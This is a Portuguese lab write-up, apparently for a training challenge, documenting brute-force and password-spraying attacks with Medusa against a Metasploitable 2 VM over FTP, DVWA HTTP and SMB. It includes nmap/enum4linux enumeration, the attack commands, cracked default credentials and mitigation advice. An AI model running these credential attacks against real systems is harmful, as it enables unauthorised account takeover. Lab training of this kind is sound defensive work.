# Exercicio
Exercicio

# 🔐 Desafio DIO - Ataques de Força Bruta com Kali Linux e Medusa

## 📋 Descrição

Este projeto tem como objetivo demonstrar a utilização da ferramenta **Medusa** em um ambiente controlado para simular ataques de força bruta contra serviços vulneráveis, utilizando o **Kali Linux** e a máquina vulnerável **Metasploitable 2**.

Durante os testes foram explorados cenários de autenticação em serviços FTP, aplicações web (DVWA) e SMB, buscando compreender como ataques de força bruta funcionam e quais medidas podem ser adotadas para mitigá-los.

> ⚠️ Todos os testes foram realizados em ambiente de laboratório e possuem finalidade exclusivamente educacional.

---

# 🎯 Objetivos

- Compreender ataques de força bruta em diferentes serviços.
- Utilizar o Kali Linux para auditoria de segurança.
- Conhecer a ferramenta Medusa.
- Identificar vulnerabilidades relacionadas a credenciais fracas.
- Aplicar técnicas de enumeração e validação de acesso.
- Documentar atividades de pentest de forma organizada.

---

# 🖥️ Ambiente de Laboratório

## Máquina Atacante

**Kali Linux**

| Informação | Valor |
|------------|--------|
| Sistema Operacional | Kali Linux |
| IP | 192.168.56.10 |

---

## Máquina Alvo

**Metasploitable 2**

| Informação | Valor |
|------------|--------|
| Sistema Operacional | Metasploitable 2 |
| IP | 192.168.56.20 |

---

# 🌐 Topologia da Rede

```text
+--------------------+
| Kali Linux         |
| 192.168.56.10      |
+---------+----------+
          |
          |
      Host-Only
          |
          |
+---------+----------+
| Metasploitable 2   |
| 192.168.56.20      |
+--------------------+
```

---

# 🛠️ Ferramentas Utilizadas

- Kali Linux
- Medusa
- Nmap
- DVWA
- Metasploitable 2
- Enum4linux
- Netcat
- VirtualBox

---

# 🔍 Descoberta de Serviços

Antes dos testes foi realizado o mapeamento das portas abertas utilizando o Nmap.

```bash
nmap -sV 192.168.56.20
```

### Resultado esperado

```text
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

---

# 🚨 Cenário 1 - Força Bruta em FTP

## Criação da Wordlist

Arquivo:

```text
wordlist.txt
```

Conteúdo:

```text
123456
admin
password
msfadmin
toor
root
```

---

## Execução do Ataque

```bash
medusa -h 192.168.56.20 -u msfadmin -P wordlist.txt -M ftp
```

### Resultado

```text
ACCOUNT FOUND:
Host: 192.168.56.20
User: msfadmin
Password: msfadmin
```

---

## Validação do Acesso

```bash
ftp 192.168.56.20
```

```text
User: msfadmin
Password: msfadmin
```

A autenticação foi realizada com sucesso.

---

# 🌐 Cenário 2 - Ataque ao DVWA

## Acesso à Aplicação

```text
http://192.168.56.20/dvwa
```

Credenciais padrão:

```text
Usuário: admin
Senha: password
```

Configuração:

```text
DVWA Security = Low
```

---

## Teste de Credenciais

Exemplo:

```bash
medusa -h 192.168.56.20 -u admin -P wordlist.txt -M http
```

---

## Resultado Obtido

Foi possível identificar credenciais fracas, como:

```text
admin:password
admin:admin
```

---

# 🖧 Cenário 3 - Password Spraying SMB

## Enumeração de Usuários

```bash
enum4linux 192.168.56.20
```

### Usuários identificados

```text
root
msfadmin
user
service
```

---

## Criando a Lista de Usuários

Arquivo:

```text
usuarios.txt
```

Conteúdo:

```text
root
msfadmin
user
service
```

---

## Password Spraying

Utilizando uma senha comum para todos os usuários:

```bash
medusa -h 192.168.56.20 -U usuarios.txt -p password -M smbnt
```

---

## Resultado

```text
ACCOUNT FOUND:
User: user
Password: password
```

---

# 🔎 Vulnerabilidades Encontradas

## Senhas Fracas

Exemplos:

```text
123456
password
admin
```

Impacto:

- Acesso não autorizado
- Vazamento de dados
- Escalada de privilégios

---

## Credenciais Padrão

Exemplos:

```text
admin:password
msfadmin:msfadmin
```

Impacto:

- Comprometimento imediato do serviço

---

## Ausência de Bloqueio de Conta

Foi possível realizar diversas tentativas consecutivas de autenticação.

Impacto:

- Facilita ataques automatizados de força bruta

---

# ✅ Recomendações de Mitigação

## Política de Senhas Fortes

Requisitos mínimos:

- 12 caracteres ou mais
- Letras maiúsculas
- Letras minúsculas
- Números
- Caracteres especiais

---

## Implementação de MFA

Exemplo:

```text
Senha + Aplicativo Autenticador
```

---

## Bloqueio de Conta

Exemplo:

```text
5 tentativas inválidas
↓
Conta bloqueada por 15 minutos
```

---

## Monitoramento de Logs

Monitorar:

- Tentativas de login
- Endereços IP
- Horários de acesso
- Eventos de autenticação

---

## Remoção de Credenciais Padrão

Alterar imediatamente:

```text
admin/admin
root/root
password/password
```

---

# 📚 Aprendizados

Durante a execução deste laboratório foi possível compreender:

- O funcionamento dos ataques de força bruta.
- A utilização do Medusa para auditoria de credenciais.
- A importância da enumeração na coleta de informações.
- Os riscos associados a senhas fracas.
- A efetividade de mecanismos de proteção como MFA e bloqueio de contas.

---

# ✅ Conclusão

A realização deste desafio permitiu compreender na prática como ataques de força bruta podem comprometer serviços expostos quando não existem mecanismos adequados de proteção.

A utilização do Kali Linux e do Medusa demonstrou como atacantes podem automatizar grandes volumes de tentativas de autenticação, reforçando a importância da adoção de boas práticas de segurança, políticas de senha fortes, autenticação multifator e monitoramento contínuo dos ambientes.
